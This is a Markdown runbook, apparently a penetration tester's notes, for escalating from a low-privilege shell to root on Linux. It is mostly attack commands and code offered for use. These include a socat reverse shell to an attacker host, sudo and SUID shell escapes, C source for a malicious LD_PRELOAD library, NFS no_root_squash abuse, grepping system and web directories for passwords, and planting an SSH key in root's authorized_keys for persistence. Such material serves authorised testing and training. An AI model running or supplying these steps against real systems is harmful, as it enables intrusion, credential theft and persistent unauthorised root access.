---
tags: [linux, privesc, enumeration, sudo, suid, kernel]
target_arch: x64, x86
os: linux
---

# 🐧 Linux Privilege Escalation (400/500 Level)

> [!ABSTRACT]
> This runbook is the definitive guide for escalating from a low-privilege shell to `root` on Linux systems.
> **Goal**: Stabilize the environment, identify misconfigurations (Sudo/SUID), and exploit kernel/service vulnerabilities.

---

## 🔍 Phase 1: Shell Stabilization (The "Prentice" Phase)

> [!TIP] Never work in a "dumb" shell. Stabilize immediately for tab-completion and job control.

```bash
# Method 1: Python (Preferred)
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z, then:
stty raw -echo; fg
export TERM=xterm-256color

# Method 2: Script
script -qc /bin/bash /dev/null

# Method 3: Socat (If available on target)
# Kali: socat file:`tty`,raw,echo=0 tcp-listen:4444
# Victim: socat tcp:<KALI_IP>:4444 exec:"bash -li",pty,stderr,setsid,sigint,sane
```

---

## 🛠️ Phase 2: Rapid Enumeration

### 1. Automated Checkers
| Tool | Purpose | Command |
| :--- | :--- | :--- |
| **LinPEAS** | Comprehensive check | `./linpeas.sh` |
| **pspy** | Process monitoring | `./pspy64 -pf -i 1000` |
| **LSE** | Logic-based enum | `./lse.sh -l2` |

### 2. Manual "Quick Hits"
```bash
# Sudo Privileges
sudo -l

# SUID Binaries
find / -perm -4000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Writable /etc/passwd
ls -la /etc/passwd

# Network Listeners (Internal only)
ss -tulpn | grep 127.0.0.1
```

---

## 🚀 Phase 3: Exploitation (PrivEsc Vectors)

### 1. Sudo & SUID (GTFOBins)
> [!IMPORTANT] Always cross-reference `sudo -l` and SUID results with [GTFOBins](https://gtfobins.github.io).

```bash
# Example: Sudo Vim
sudo vim -c '!sh'

# Example: SUID Find
find . -exec /bin/sh -p \; -quit
```

### 2. Shared Library Hijacking (LD_PRELOAD)
If `env_keep += LD_PRELOAD` is present in `sudo -l`:
1. Compile malicious `.so`:
   ```c
   #include <stdio.h>
   #include <sys/types.h>
   #include <stdlib.h>
   void _init() { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash"); }
   ```
   `gcc -fPIC -shared -o /tmp/pe.so pe.c -nostartfiles`
2. Execute: `sudo LD_PRELOAD=/tmp/pe.so <COMMAND>`

### 3. NFS no_root_squash
If `/etc/exports` shows `no_root_squash`:
1. From Kali: `mount -t nfs <IP>:/share /mnt/nfs`
2. `cp /bin/bash /mnt/nfs/bash; chmod +s /mnt/nfs/bash`
3. From Victim: `/share/bash -p`

---

## 📂 Phase 4: Credential Hunting & Post-Exploitation

### 1. History & Configs
```bash
cat ~/.bash_history
grep -rEi "password|pass|secret" /etc/ /var/www/ /home/ 2>/dev/null
```

### 2. SSH Persistence
```bash
# Add your key to root (if you gain access)
echo "ssh-rsa AAAAB3..." >> /root/.ssh/authorized_keys
```

---

## 🔗 Related Notes
- [[Active Directory]] - If the Linux host is domain-joined (check `realm list`).
- [[Admin Reference]] - For user management and SSH key generation.
- [[Pivoting & Tunneling]] - For routing internal traffic back to Kali.
- [[File Transfer]] - For uploading `linpeas` and `pspy`.
